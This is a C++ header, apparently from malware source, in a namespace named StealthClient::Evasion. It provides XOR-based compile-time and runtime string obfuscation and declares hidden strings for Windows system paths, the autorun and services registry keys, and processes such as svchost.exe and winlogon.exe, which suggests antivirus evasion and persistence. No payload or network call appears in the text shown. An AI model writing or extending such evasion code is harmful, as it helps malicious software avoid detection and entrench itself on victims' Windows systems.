#pragma once
#include <string>
#include <vector>
#include <random>
#include <chrono>

namespace StealthClient {
namespace Evasion {

// Compile-time string obfuscation
template<size_t N>
class ObfuscatedString {
private:
    char m_data[N];
    uint8_t m_key;
    
public:
    constexpr ObfuscatedString(const char(&str)[N]) : m_key(0) {
        // Generate key based on string content and compile time
        m_key = static_cast<uint8_t>((str[0] + N + __TIME__[0]) & 0xFF);
        
        // XOR encrypt the string
        for (size_t i = 0; i < N - 1; i++) {
            m_data[i] = str[i] ^ (m_key + i);
        }
        m_data[N - 1] = '\0';
    }
    
    std::string decrypt() const {
        std::string result;
        result.reserve(N - 1);
        
        for (size_t i = 0; i < N - 1; i++) {
            result += static_cast<char>(m_data[i] ^ (m_key + i));
        }
        
        return result;
    }
    
    // Secure clear
    ~ObfuscatedString() {
        SecureClear();
    }
    
private:
    void SecureClear() {
        volatile char* ptr = m_data;
        for (size_t i = 0; i < N; i++) {
            ptr[i] = 0;
        }
    }
};

// Macro for compile-time string obfuscation
#define OBFUSCATE(str) ObfuscatedString(str).decrypt()

// Runtime string encryption class
class StringEncryption {
private:
    std::vector<uint8_t> m_keys;
    std::mt19937 m_rng;
    
    void GenerateKeys();
    uint8_t GetKey(size_t index) const;
    
public:
    StringEncryption();
    ~StringEncryption();
    
    // Encrypt string with multiple keys
    std::vector<uint8_t> Encrypt(const std::string& plaintext);
    
    // Decrypt string
    std::string Decrypt(const std::vector<uint8_t>& ciphertext);
    
    // Encrypt string and return as hex
    std::string EncryptToHex(const std::string& plaintext);
    
    // Decrypt from hex
    std::string DecryptFromHex(const std::string& hexString);
    
    // Secure clear memory
    void SecureClear(std::string& str);
    void SecureClear(std::vector<uint8_t>& data);
    
    // Rotate keys
    void RotateKeys();
};

// Global instance
extern StringEncryption g_StringEncryption;

// Convenience functions
std::string EncryptString(const std::string& plaintext);
std::string DecryptString(const std::vector<uint8_t>& ciphertext);
void SecureClearString(std::string& str);

// Pre-obfuscated common strings
namespace ObfuscatedStrings {
    // System paths
    extern const char* SYSTEM32_PATH;
    extern const char* WINDOWS_PATH;
    extern const char* TEMP_PATH;
    
    // Registry paths
    extern const char* RUN_REGISTRY;
    extern const char* SERVICES_REGISTRY;
    
    // Process names
    extern const char* EXPLORER_EXE;
    extern const char* SVCHOST_EXE;
    extern const char* WINLOGON_EXE;
    
    // File extensions
    extern const char* DLL_EXT;
    extern const char* EXE_EXT;
    extern const char* SYS_EXT;
    
    // Initialize all obfuscated strings
    void Initialize();
}

} // namespace Evasion
} // namespace StealthClient
